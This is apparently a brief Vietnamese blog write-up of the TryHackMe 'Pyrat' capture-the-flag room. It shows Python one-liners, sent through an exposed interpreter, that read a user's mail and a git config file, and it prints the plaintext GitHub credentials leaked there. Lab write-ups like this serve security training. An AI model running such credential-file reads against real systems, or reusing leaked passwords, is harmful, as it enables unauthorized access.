+++
title = "TryHackMe: Pyrat"
date = 2025-01-30
description = "Walkthrough challenge Pyrat trên TryHackMe — Python IDLE exploitation, Git credential leak, privilege escalation."
[taxonomies]
tags = ["ctf", "tryhackme", "python", "git", "privilege-escalation"]
[extra]
toc = true
+++

Walkthrough challenge **Pyrat** trên TryHackMe — exploit **Python IDLE**, **Git credential leak**, và **privilege escalation**.

<!-- more -->

Keyword: Python IDLE, Git, Privilege Escalation

## Thông tin quan trọng

Đọc mail của user think:

```python
print(open("/var/mail/think").read())
```

```
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
Subject: Hello
To: <think@pyrat>
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT
you posted on your GitHub page, i'll test it tonight so don't be
scared if you see it running. Regards, Dbile Admen
```

## Git Credential Leak

Đọc Git config:

```python
print(open("/opt/dev/.git/config").read())
```

```ini
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
[user]
    name = Jose Mario
    email = josemlwdf@github.com
[credential]
    helper = cache --timeout=3600
[credential "https://github.com"]
    username = think
    password = _TH1NKINGPirate$_
```

Credentials tìm được → **privilege escalation** 🎉
